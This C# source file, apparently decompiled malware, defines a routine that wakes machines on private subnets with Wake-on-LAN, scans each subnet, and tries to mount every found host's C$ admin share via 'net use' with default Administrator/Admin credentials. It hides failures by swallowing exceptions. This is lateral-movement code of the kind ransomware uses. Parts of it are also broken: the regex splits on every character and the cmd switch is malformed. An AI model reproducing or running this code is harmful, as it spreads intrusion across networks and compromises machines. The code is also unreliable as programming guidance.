using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Complex;

internal class AwakeMe
{
	public static void Wake()
	{
		List<IPInfo> iPInfo = IPInfo.GetIPInfo();
		foreach (IPInfo item in iPInfo)
		{
			try
			{
				if (item.IPAddress.StartsWith("10.") || item.IPAddress.StartsWith("172.16.") || item.IPAddress.StartsWith("192.168."))
				{
					WakeOnLan.WakeUp(item.MacAddress, item.IPAddress, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		foreach (IPInfo item2 in iPInfo)
		{
			try
			{
				Regex regex = new Regex(".");
				string subnet = regex.Split(item2.IPAddress)[0] + "." + regex.Split(item2.IPAddress)[1] + "." + regex.Split(item2.IPAddress)[2];
				List<string> list = NetScan.scan(subnet);
				foreach (string item3 in list)
				{
					if (item2.IPAddress.StartsWith("10.") || item2.IPAddress.StartsWith("172.16.") || item2.IPAddress.StartsWith("192.168."))
					{
						Program.ProcessCommand("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Administrator Administrator");
						Program.ProcessCommand("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Admin Admin");
					}
				}
			}
			catch
			{
			}
		}
	}
}
